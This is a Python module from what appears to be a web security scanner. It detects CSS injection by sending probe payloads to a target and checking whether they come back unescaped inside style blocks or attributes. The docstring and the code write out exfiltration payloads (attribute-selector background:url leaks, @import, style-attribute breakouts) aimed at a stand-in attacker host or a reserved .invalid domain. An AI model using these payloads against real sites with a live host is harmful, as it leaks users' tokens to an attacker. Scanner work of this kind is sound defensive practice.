"""
_css_injection.py — CSS injection / scriptless data exfiltration (v10.59).

When user input is reflected into a <style> block or a style="…" attribute,
an attacker can inject CSS even where a Content-Security-Policy blocks all
JavaScript. CSS injection is a real, CSP-RESISTANT vulnerability class:

  • Data exfiltration via attribute selectors + background:url()
      input[value^="a"]{background:url(//attacker/a)}   → leaks tokens char-by-char
  • @import url(//attacker)  in a <style> block          → loads attacker CSS
  • style-attribute breakout — reflection into style="color:INPUT" injects a new
      declaration: INPUT = red;background:url(//attacker?leak=…)

DETECTION (two steps, precision-first):
  1) Confirm the marker actually lands in a CSS CONTEXT (inside <style>…</style>
     or a style="…" attribute) — otherwise it's the context scan's job, not ours.
  2) Confirm BREAKOUT: the CSS-structural characters we need (`}` to close a rule
     / `;` to add a declaration / `url(` / `@import`) survive UNESCAPED in that
     context. If the app escapes them (&#125; etc.) the injection is inert → drop.

The exfil host is the reserved `.invalid` TLD (never resolves) — we prove the
vector without contacting anything.

Public API:
    css_context(body, marker) -> "style-block" | "style-attr" | None
    scan_css_injection(inject, session, url, param, timeout, follow_redirects,
                       marker_factory) -> List[Dict]
"""

from __future__ import annotations

import re
from typing import Callable, Dict, List, Optional

_NET_EXC = (Exception,)
_EXFIL = "//xssg-exfil.invalid/"   # reserved TLD; harmless, identifiable


def _get(session, url: str, timeout: float, follow_redirects: bool) -> str:
    try:
        r = session.get(url, timeout=timeout, allow_redirects=follow_redirects)
        return r.text or ""
    except _NET_EXC:
        return ""


def css_context(body: str, marker: str) -> Optional[str]:
    """Return the CSS context the marker landed in, or None."""
    if not body or marker not in body:
        return None
    # Inside a <style>…</style> block?
    for m in re.finditer(r"<style\b[^>]*>(.*?)</style>", body,
                         re.IGNORECASE | re.DOTALL):
        if marker in m.group(1):
            return "style-block"
    # Inside a style="…" / style='…' attribute value?
    for m in re.finditer(r"""style\s*=\s*(?P<q>["'])(?P<v>.*?)(?P=q)""", body,
                         re.IGNORECASE | re.DOTALL):
        if marker in m.group("v"):
            return "style-attr"
    return None


def _emit(url, param, payload, vector, severity, evidence) -> Dict:
    return {
        "url": url, "param": param, "payload": payload,
        "context": f"css-injection-{vector}", "source": "css",
        "severity": severity, "cwe_hint": "CWE-79",
        "evidence": evidence,
        "description": (
            "User input is reflected into a CSS context and structural CSS "
            "survives unescaped (" + vector + "). This enables CSS injection — "
            "scriptless data exfiltration (attribute-selector + background:url / "
            "@import), which works even under a strict CSP. Context-encode the "
            "value or reject it from style sinks."),
    }


def scan_css_injection(inject, session, url: str, param: str, timeout: float,
                       follow_redirects: bool,
                       marker_factory: Callable[[], str]) -> List[Dict]:
    """Detect CSS injection at (url, param). Returns engine-standard findings.
    `inject` is the engine's inject_into_params(url, param, value)."""
    findings: List[Dict] = []

    # ── Step 1: does a plain marker land in a CSS context? ──
    probe_m = marker_factory()
    probe_url = inject(url, param, probe_m)
    if not probe_url:
        return findings
    body = _get(session, probe_url, timeout, follow_redirects)
    ctx = css_context(body, probe_m)
    if ctx is None:
        return findings

    # ── Step 2: breakout, per context ──
    if ctx == "style-block":
        m = marker_factory()
        # Close the current rule, add an attacker-controlled exfil rule.
        payload = m + "}*{background:url(" + _EXFIL + m + ")}"
        vector, sev = "style-block-breakout", "high"
        rx = re.escape(m) + r"\}\s*\*\s*\{[^}]*url\(\s*" + re.escape(_EXFIL)
    else:  # style-attr
        m = marker_factory()
        # Inject a new declaration into the style attribute.
        payload = m + ";background:url(" + _EXFIL + m + ")"
        vector, sev = "style-attr-breakout", "high"
        rx = re.escape(m) + r"\s*;\s*background\s*:\s*url\(\s*" + re.escape(_EXFIL)

    test_url = inject(url, param, payload)
    if not test_url:
        return findings
    body2 = _get(session, test_url, timeout, follow_redirects)
    # The breakout must survive IN A CSS CONTEXT and UNESCAPED.
    if css_context(body2, m) is not None and re.search(rx, body2, re.IGNORECASE):
        findings.append(_emit(test_url, param, payload, vector, sev,
                              f"CSS breakout survived unescaped in {ctx}"))
    # Also try @import (some sinks strip {} but allow @import at rule level).
    if ctx == "style-block" and not findings:
        m3 = marker_factory()
        payload3 = m3 + ";@import url(" + _EXFIL + m3 + ");"
        turl3 = inject(url, param, payload3)
        if turl3:
            b3 = _get(session, turl3, timeout, follow_redirects)
            rx3 = re.escape(m3) + r"\s*;\s*@import\s+url\(\s*" + re.escape(_EXFIL)
            if css_context(b3, m3) is not None and re.search(rx3, b3, re.IGNORECASE):
                findings.append(_emit(turl3, param, payload3,
                                      "style-block-import", "high",
                                      "CSS @import injection survived unescaped"))
    return findings
